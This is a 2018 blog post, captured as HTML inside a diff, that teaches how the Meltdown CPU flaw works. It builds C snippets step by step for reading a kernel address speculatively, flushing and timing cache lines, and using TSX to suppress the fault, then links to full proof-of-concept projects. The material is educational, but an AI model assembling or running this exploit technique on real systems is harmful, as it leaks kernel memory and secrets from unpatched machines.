@@ -1,0 +1,608 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Programmer's Guide to Meltdown - a programmer having fun with bits</title>
+  <meta name="author" content="Raphael S. Carvalho (a.k.a. utroz)">
+
+    
+
+    <meta name="description" content=" programmer's guide to meltdown exploit poc ">
+    
+      <meta name="keywords" content="meltdown, exploit, proof-of-concept, poc, kpti, kaiser, security">
+    
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://funwithbits.net/blog/programmers-guide-to-meltdown/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="a programmer having fun with bits" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-91853321-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Fun with Bits</a></h1>
+  
+    <h2>Raphael S. Carvalho's space on the internet for random thoughts</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="funwithbits.net">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">homepage</a></li>
+  <li><a href="/blog/archives">archives</a></li>
+  <li><a href="https://github.com/funwithbits/www.funwithbits.net/tree/source">blog's source code</a>
+  <li><a href="https://github.com/funwithbits/www.funwithbits.net/tree/source/source/_posts">all posts in github</a>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Programmer's Guide to Meltdown</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-01-09T23:57:48-02:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>11:57 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Ok, what I want here is to guide you through a Meltdown proof-of-concept that
+peeks into kernel data that cpu is supposed to protect. Unfortunately, that
+promise was broken and virtually all intel x86 cpu hosts are vulnerable until
+patched (Linux patchset is available and named <a href="https://lkml.org/lkml/2017/10/31/884">kpti (kernel page table isolation)</a>).</p>
+
+<p>So far, we thought we were protected by cpu mechanisms because when you try
+to load kernel (sensitive) data, cpu triggers an exception which in turn is
+propagated by kernel to application as SIGSEGV, leading to application
+termination, look at this example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /proc/kallsyms <span class="p">|</span> grep banner
+</span><span class='line'>ffffffff81a00060 R linux_proc_banner
+</span><span class='line'><span class="nv">$ </span>cat kernel_address_read.cc
+</span><span class='line'>main<span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>      char *p <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>0xffffffff81a00060<span class="p">;</span> // use address of a kernel symbol containing banner
+</span><span class='line'>  *p <span class="o">=</span> 0<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'><span class="nv">$ </span>./kernel_address_read
+</span><span class='line'>+++ killed by SIGSEGV <span class="o">(</span>core dumped<span class="o">)</span> +++
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So time went by, and we all thought we were safe. Recently it was figured out
+that speculative execution could be exploited to break that promise.
+It basically consists of making the cpu use the value stored in a kernel
+address before the cpu detects the access to kernel data is an invalid
+instruction, but it&rsquo;s not that simple&hellip; look at this example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">kernel_data</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">kernel_data</span> <span class="o">+</span> <span class="n">number</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It turns out that cpu may actually perform the addition of value found in kernel
+address and 10, but the result is definitely not returned to the program which
+again terminates with a SIGSEGV.</p>
+
+<p>Now comes the BINGO, EUREKA! moment: A researcher figured out that whichever
+data (in example above kernel_data and byte) used in the instruction
+that procedes the invalid one (*kernel_address) will remain cached in the
+cpu data cache. Yes! CPU doesn&rsquo;t invalidate data cached from an instruction
+which used the result (kernel data) of an invalid one (access to kernel data).</p>
+
+<p>Well, data cache cannot directly be read. But we know that access to data
+cached is much faster than to uncached ones, so what we can do is to use the
+byte read from kernel as an index for an array of size 256 elements, each index
+representing a possible representation of a byte (0..255). For example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span><span class="p">];</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That would only work if cache line size is 1, but it&rsquo;s usually 64 for level 1,
+so we need to multiply array size and index by 64.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So if it happens that the instruction that accesses array using byte read from
+kernel is executed before cpu triggers exception for invalid access to kernel,
+it means cpu will bring array[kernel_data_as_index * cache_line_size] to cache.</p>
+
+<p>Now we know that we can iterate through the 256 &ldquo;cache lines&rdquo; in array, and
+we&rsquo;ll know that the one with the fastest access time is the one cached by cpu,
+and the &ldquo;cache line&rdquo; index is actually the byte read from kernel.</p>
+
+<p>For example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Please consider for now that signal handler for sigsegv was set up,</span>
+</span><span class='line'><span class="c1">// and we continue executing from here after invalid access</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">MAX_INTEGER_VALUE</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="n">access_time_to</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">time</span> <span class="o">&lt;</span> <span class="n">fastest_i_time</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">fastest_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;byte read from kernel is: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fastest_i</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s not hard to understand it. If you think of it, fastest_i is equal to the
+byte stored in kernel_address because program determined array[fastest_i *
+cache_line_size] is cached by cpu and only one place in array was cached
+previously by the instructions that accessed kernel and used its value to
+retrieve a byte from array.</p>
+
+<p>In real life, it&rsquo;s not that simple to implement because you need to clear data
+cache (clflush instruction can be used) before performing the test because you
+want to read more bytes and the data cache shouldn&rsquo;t be polluted for array or
+wrong result is returned.</p>
+
+<p>This is my assembly inline to clear cache line for a specific address:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+</span><span class='line'><span class="kr">inline</span> <span class="kt">void</span> <span class="n">__clflush</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">address</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">asm</span> <span class="n">__volatile__</span> <span class="p">(</span>
+</span><span class='line'>        <span class="s">&quot;mfence         </span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>        <span class="s">&quot;clflush 0(%0)  </span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>        <span class="o">:</span>
+</span><span class='line'>        <span class="o">:</span> <span class="s">&quot;r&quot;</span> <span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span><span class='line'>        <span class="o">:</span>            <span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So you&rsquo;ll need to do that for each &ldquo;cache line&rdquo; in the array, the code now
+becomes this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">__clflush</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">MAX_INTEGER_VALUE</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="n">access_time_to</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">time</span> <span class="o">&lt;</span> <span class="n">fastest_i_time</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">fastest_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;byte read from kernel is: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fastest_i</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s not complete code because you&rsquo;ll have to set up signal handler or use
+TSX (Transactional Synchronization Extensions) to mitigate SIGSEGV that occurs
+after the instruction to load kernel address retires (is fully executed).
+Follow example using TSX:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">__clflush</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">_xbegin</span><span class="p">()</span> <span class="o">==</span> <span class="n">_XBEGIN_STARTED</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">_xend</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// do nothing</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">MAX_INTEGER_VALUE</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="n">access_time_to</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">time</span> <span class="o">&lt;</span> <span class="n">fastest_i_time</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">fastest_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;byte read from kernel is: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fastest_i</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s nothing much you can do with this code that only reads 1 byte from
+kernel space, so I&rsquo;d suggest you to take a look at the code of my own project
+that exploits meltdown to check whether or not system is affected, follow link:
+<a href="https://github.com/raphaelsc/Am-I-affected-by-Meltdown">https://github.com/raphaelsc/Am-I-affected-by-Meltdown</a>
+I&rsquo;d also recommend you to take a look at proof-of-concept of the researchers
+involved: <a href="https://github.com/IAIK/meltdown/">https://github.com/IAIK/meltdown/</a></p>
+
+<p>Cheers!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Raphael S. Carvalho (a.k.a. utroz)</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2018-01-09T23:57:48-02:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>11:57 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/hardware/'>hardware</a>, <a class='category' href='/blog/categories/programming/'>programming</a>, <a class='category' href='/blog/categories/security/'>security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://funwithbits.net/blog/programmers-guide-to-meltdown/" data-via="raphael_scarv" data-counturl="http://funwithbits.net/blog/programmers-guide-to-meltdown/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/dissecting-the-rom-bios-shipped-with-qemu-for-fun/" title="Previous Post: Dissecting the ROM BIOS shipped with QEMU for fun">&laquo; Dissecting the ROM BIOS shipped with QEMU for fun</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/resuming-the-blog-and-shifting-its-focus/" title="Next Post: Resuming the blog and shifting its focus">Resuming the blog and shifting its focus &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>$ whoami</h1>
+  <p>
+    <img src="https://avatars3.githubusercontent.com/u/1409139?v=3&s=200" alt="me" style="float:right;width:82px;height:82px;">
+  I'm Raphael S. Carvalho, a.k.a. utroz. I'm a computer programmer who loves operating system design and implementation,
+  and recently developed an interest in game programming. Works on <a href="http://www.scylladb.com/">ScyllaDB</a>
+  </p>
+  <p style="font-size:14px">
+    <img src="/images/twitter-16x16.gif" alt="me" style="float:left;width:20px;height:20px;">
+    &nbsp;<a href="https://twitter.com/raphael_scarv">This is my twitter page</a>
+    <br/>
+    <img src="/images/email.png" alt="me" style="float:left;width:20px;height:20px;">
+    &nbsp;<a href="http://raphaelsc.github.io/">Find my mail at my webpage</a>
+  </p>
+    <form style="border:1px solid #ccc;padding:3px;text-align:center;" action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open('https://feedburner.google.com/fb/a/mailverify?uri=funwithbits', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true"><p>Subscribe through your email:</p><p><input type="text" style="width:140px" name="email"/></p><input type="hidden" value="funwithbits" name="uri"/><input type="hidden" name="loc" value="en_US"/><input type="submit" value="Subscribe" /><p>Delivered by <a href="https://feedburner.google.com" target="_blank">FeedBurner</a></p></form>
+  </p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/resuming-the-blog-and-shifting-its-focus/">Resuming the Blog and Shifting Its Focus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/programmers-guide-to-meltdown/">Programmer's Guide to Meltdown</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/dissecting-the-rom-bios-shipped-with-qemu-for-fun/">Dissecting the ROM BIOS Shipped With QEMU for Fun</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/programming-and-classical-music/">Programming and Classical Music</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/c-plus-plus-framework-for-writing-servers-as-fast-as-usain-bolt/">C++ Framework for Writing Servers Which Are as Fast as Usain Bolt</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
